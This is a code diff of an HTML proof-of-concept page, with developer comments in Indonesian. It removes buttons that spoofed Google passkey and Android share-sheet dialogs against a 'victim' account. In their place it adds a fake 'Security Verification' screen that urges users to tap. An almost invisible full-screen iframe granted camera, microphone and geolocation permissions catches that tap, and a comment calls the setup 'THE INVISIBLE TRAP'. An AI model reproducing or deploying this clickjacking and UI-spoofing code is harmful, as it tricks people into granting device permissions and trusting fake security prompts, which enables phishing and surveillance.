@@ -2,83 +2,68 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>System Bypass PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Account Verification</title>
   <style>
-    body { 
-      font-family: sans-serif; 
-      text-align: center; 
-      margin-top: 50px; 
+    body, html {
+      margin: 0; 
+      padding: 0; 
+      height: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       background: #f8f9fa;
+      overflow: hidden;
     }
-    .btn { 
-      padding: 15px 20px; 
-      font-size: 16px; 
-      margin: 15px 0; 
-      background: #1a73e8; 
-      color: #fff; 
-      border: none; 
-      border-radius: 8px; 
-      cursor: pointer; 
-      width: 85%; 
-      font-weight: bold;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    .container {
+      display: flex; 
+      flex-direction: column;
+      align-items: center; 
+      justify-content: center;
+      height: 100vh; 
+      text-align: center;
+      padding: 20px;
+      box-sizing: border-box;
     }
-    .btn:active { background: #1557b0; }
-    p { color: #5f6368; font-size: 14px; padding: 0 20px;}
+    h2 { 
+      color: #202124; 
+      margin-bottom: 10px; 
+      font-size: 22px;
+    }
+    p { 
+      color: #1a73e8; 
+      font-size: 18px; 
+      font-weight: 600; 
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0% { opacity: 1; }
+      50% { opacity: 0.5; }
+      100% { opacity: 1; }
+    }
+    
+    /* 
+       THE INVISIBLE TRAP 
+       Iframe dibikin transparan dan nutupin 100% layar. 
+       Korban ngeklik layar = ngeklik iframe = bypass tereksekusi!
+    */
+    #frame {
+      position: absolute;
+      top: 0; 
+      left: 0;
+      width: 100vw; 
+      height: 100vh;
+      border: 0;
+      z-index: 999;
+      opacity: 0.01; 
+    }
   </style>
 </head>
 <body>
-  <h2>Out-of-Bounds UI Bypass</h2>
-  <p>Targeting Android System & Google Play Services UI</p>
+  <div class="container">
+    <h2>Security Verification</h2>
+    <p>👆 TAP ANYWHERE TO CONTINUE 👆</p>
+  </div>
 
-  <button class="btn" onclick="triggerPasskey()">1. Trigger WebAuthn (Passkey)</button>
-  <button class="btn" onclick="triggerShare()">2. Trigger Android Share Sheet</button>
-
-  <script>
-    // =========================================================
-    // BYPASS 1: WEBAUTHN / PASSKEY (GOOGLE PLAY SERVICES UI)
-    // Chrome mengirim origin ke GMS, GMS yang render layarnya!
-    // =========================================================
-    async function triggerPasskey() {
-      try {
-        await navigator.credentials.create({
-          publicKey: {
-            challenge: new Uint8Array(32),
-            rp: { 
-              name: "Account Security", 
-              id: window.location.hostname // INI YANG BAKAL DIRENDER SAMA GMS
-            },
-            user: { 
-              id: new Uint8Array(16), 
-              name: "victim@gmail.com", 
-              displayName: "Victim User" 
-            },
-            pubKeyCredParams: [{type: "public-key", alg: -7}],
-            timeout: 60000,
-            authenticatorSelection: { userVerification: "required" }
-          }
-        });
-      } catch(e) { 
-        console.log("Passkey dismissed"); 
-      }
-    }
-
-    // =========================================================
-    // BYPASS 2: WEB SHARE API (ANDROID NATIVE SHARE SHEET)
-    // Memaksa sistem Android menampilkan URL di Share Preview
-    // =========================================================
-    function triggerShare() {
-      if (navigator.share) {
-        navigator.share({
-          title: 'Google Security Update',
-          text: 'Please verify your account information.',
-          url: window.location.href // INI BAKAL MUNCUL DI PREVIEW SHARE
-        }).catch(console.error);
-      } else {
-        alert("Web Share API not supported on this browser.");
-      }
-    }
-  </script>
+  <!-- Ini akan meload file UI Redressing lu secara tersembunyi -->
+  <iframe id="frame" allow="camera *; microphone *; geolocation *" src="ligatures-perm-frame.html"></iframe>
 </body>
 </html>
